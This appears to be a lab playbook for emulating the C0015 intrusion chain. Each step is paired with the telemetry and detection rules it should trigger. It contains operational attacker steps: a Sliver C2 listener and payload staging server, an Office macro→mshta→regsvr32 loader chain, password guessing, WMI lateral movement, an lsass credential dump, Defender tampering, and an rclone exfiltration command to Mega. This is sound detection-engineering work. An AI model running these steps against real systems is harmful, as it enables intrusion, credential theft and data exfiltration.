# Attack playbook

How to reproduce the C0015 chain in the lab, from a clean environment to the impact step, and what each
step should produce in telemetry. This is the operator view; the analyst view is in
[`reports/cases/`](../reports/cases/office-loader.md).

The chain is exercised only against the isolated lab. Every step below names the artefact it creates and
the event a detector should see, so a run can be checked against the [reference run](../reports/reference-run.md).

## 0. Prerequisites

| Component | Minimum | Check |
|---|---|---|
| Domain | `C0015.LAB`, DC `DC01` | `nltest /dsgetdc:C0015.LAB` |
| Workstation | `WS01` 192.168.50.20, Word installed | `winword /?` |
| File server | `FS01` 192.168.50.30, corpus share | `dir \\FS01\C$\C0015\corpus` |
| Linux host | Kali 192.168.50.100, Sliver, HTTP staging | `curl -I http://192.168.50.100/updater.exe` |
| Sensors | Sysmon (E1,3,7,8,10,11,13), Security audit | see [`infra/sysmon/`](../infra/sysmon/) |
| Agent | Elastic Agent shipping to the stack | Kibana shows both hosts |

Accounts: `duc.user` is a standard user and a member of `Remote Desktop Users` on `WS01`; `helpdesk` is a
domain account in `IT-Support`, which is a local administrator on both hosts. The lab weakness
(`C0015Updater`, a SYSTEM task that runs a file in a user-writable directory) substitutes for the
privilege step the source report does not document.

Start the listeners before anything else:

```
# Kali
~/sliver-server_linux-amd64 daemon &
# HTTPS listener for the implant
sliver > https --lhost 192.168.50.100 --lport 443 --domain checkauj.com \
              --cert certs/checkauj.crt --key certs/checkauj.key
# staging
cd ~/www && sudo python3 -m http.server 80
```

Verify from the victim: `curl -I http://192.168.50.100/c0015_stage2.ps1` must return 200. A dead staging
server is the most common reason the chain stops after delivery.

## 1. Delivery: document to proxy execution

| Action | Artefact | Expected telemetry |
|---|---|---|
| Open `decree-08.03.2021.docm` in the victim session | macro runs | Sysmon 1: `WINWORD.EXE` → `cmd.exe` |
| Macro starts the HTA through `mshta` | `compareforfor.hta` | Sysmon 1: `cmd.exe` → `mshta.exe`; Sysmon 3 if it fetches |
| HTA starts `regsvr32` on the staged `.jpg` | `compareForfor.jpg` | Sysmon 1: `mshta.exe` → `regsvr32.exe` |
| Loader downloads the next stage | `updater.exe` written | Sysmon 1 download, Sysmon 11 file create, Sysmon 7 unsigned module |

Detectors: R01, R02, R03. The R03 event is the module load itself, so it fires even if `regsvr32` was
started a while ago.

## 2. Privilege: user to SYSTEM

| Action | Artefact | Expected telemetry |
|---|---|---|
| Weakness task fires as SYSTEM | `C0015Updater` runs `C:\ProgramData\C0015\updater.exe` | Security 4624 type 5, Sysmon 1 with SYSTEM integrity |
| Stager downloads the remaining files | `d8b3.dll`, `c0015_stage.dll`, `c0015_stage2.ps1` | Sysmon 11, Sysmon 3 |

This step is a lab substitution. In the source campaign the equivalent path is not documented; the
[gaps](../docs/study/gaps.md) page records that.

## 3. Credential recovery and lateral movement

| Action | Artefact | Expected telemetry |
|---|---|---|
| Stager guesses the helpdesk password | failed `net use` attempts | Security 4625 when the target logs them (see the note below) |
| Authenticates with the recovered password | — | Security 4624 type 3 on the target, Kerberos or NTLM |
| Runs commands over WMI | `wmic /node:FS01 ...` | Sysmon 1 `WMIC.exe` on the source, `WmiPrvSE.exe` → child on the target |
| Loader executes on the target | `143.dll` | Sysmon 1 `rundll32.exe` under `WmiPrvSE.exe`, Sysmon 7 unsigned module |

Detectors: R06 (source intent), R07 (loader under WMI), R18 (shell under WMI), R15 (auth sequence, only
when the failed attempts are logged).

> **Telemetry caveat.** Failed `net use` attempts against `\\WS01\IPC$` did not produce Security 4625 in
> this lab, so R15 stays quiet even though the guess happened. Treat the absence of 4625 as a logging
> question first, not as evidence that no guessing occurred.

## 4. Persistence and defence changes

| Action | Artefact | Expected telemetry |
|---|---|---|
| Scheduled task on the target | `C0015Persist` | Security 4698, task XML file create |
| Defender preferences relaxed | `Set-MpPreference` | Sysmon 1 `powershell.exe` command line |

No shipped rule covers either step; both appear in the run evidence as context.

## 5. Injection and credential access

| Action | Artefact | Expected telemetry |
|---|---|---|
| Write the DLL and payload | `C:\ProgramData\inj.dll`, `D8B3.bin` | Sysmon 11 |
| Inject into the per-user service host | thread in `svchost -k UnistackSvcGroup` | Sysmon 8: `rundll32.exe` → `svchost.exe` |
| Dump credentials | `dump.txt` | Sysmon 10: `mk.exe` → `lsass.exe`, mask `0x1010` |

Detectors: R04, R05. The injection needs a logged-in user session on the target, because the per-user
host only exists while one is open.

## 6. Collection and impact

| Action | Artefact | Expected telemetry |
|---|---|---|
| Copy the share to the cloud remote | `rclone copy \\FS01\Shares Mega:DATA` | Sysmon 1 rclone with `copy`/`sync` and `mega` |
| Simulate impact | five `readme.txt`, forty renamed files | Sysmon 11 note creation |

Detectors: R11, R12. The simulator renames files; it does not encrypt.

## 7. Capture and check

```
ES_PASS=... python3 tools/evidence/capture_run.py --run-id run-1 \
  --start 2026-10-27T12:20:00Z --end 2026-10-27T12:40:00Z \
  --out evidence/runs/run-1 --capture-id cap-run1-1

python3 tools/evidence/validate_run.py evidence/runs/run-1
```

The capture resolves each alert to its source event and queries context around each anchor. Compare the
result with the [reference run](../reports/reference-run.md): 33 C0015 alerts from 12 rules, all resolved.

## 8. Reset

| Step | Command |
|---|---|
| Restore the corpus | `run-impact.ps1 -Corpus C:\C0015\corpus -Action Rollback` |
| Kill the chain | stop `WINWORD`, `mshta`, `regsvr32`, `rundll32`, `rclone` on both hosts |
| Remove the artefacts | `C:\ProgramData\C0015`, `C:\Users\Public\C0015`, `dump.txt`, `locker.bat` |
| Remove the tasks | `schtasks /delete /tn C0015Persist /f`, `C0015Word`, `C0015Updater` replanted per run |
| Clear alerts | scoped: delete only alerts whose rule id starts with `c0015-` in the run window |

Never use `match_all` against the alert index: it removes every other rule's alerts in the space.

## Checklist

- [ ] Listeners up and reachable from the victim
- [ ] Victim session open, Word starts
- [ ] Target session open, per-user service host exists
- [ ] Document opens, chain reaches the stager
- [ ] Persistence task present, injection reported `verified`
- [ ] `dump.txt` non-empty, notes and renamed files present
- [ ] Capture run and bundle validates
